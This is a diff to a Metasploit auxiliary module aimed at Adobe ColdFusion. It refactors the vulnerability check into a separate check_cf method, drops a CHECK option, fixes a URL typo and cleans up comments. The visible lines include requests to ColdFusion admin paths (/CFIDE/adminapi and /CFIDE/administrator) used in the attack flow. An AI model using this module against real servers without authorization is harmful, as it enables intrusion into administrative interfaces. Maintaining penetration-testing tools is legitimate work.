@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -43,7 +43,6 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptBool.new('CHECK', [false, 'Only check for vulnerability', false]),
         OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
       ], self.class)
   end
@@ -116,6 +115,14 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check
+    if check_cf
+      return Msf::Exploit::CheckCode::Vulnerable
+    end
+
+    Msf::Exploit::CheckCode::Safe
+  end
+
+  def check_cf
     vuln = false
     url = '/CFIDE/adminapi/customtags/l10n.cfm'
     res = send_request_cgi({
@@ -151,14 +158,14 @@ class Metasploit3 < Msf::Auxiliary
     filename = ""
 
     url = '/CFIDE/administrator/index.cfm'
-#		print_status("Getting index...")
+    # print_status("Getting index...")
     res = send_request_cgi({
         'uri' => url,
         'method' => 'GET',
         'Connection' => "keep-alive",
         'Accept-Encoding' => "zip,deflate",
         })
-#		print_status("Got back: #{res.inspect}")
+    # print_status("Got back: #{res.inspect}")
     return if not res
     return if not res.body or not res.code
     return if not res.code.to_i == 200
@@ -171,16 +178,10 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    if(not check)
+    if(not check_cf)
       print_status("#{peer} can't be exploited (either files missing or permissions block access)")
       return
     end
-
-    if (datastore['CHECK'] )
-      print_good("#{peer} is vulnerable and most likely exploitable") if check
-      return
-    end
-
 
     res = send_request_cgi({
       'method'   => 'GET',
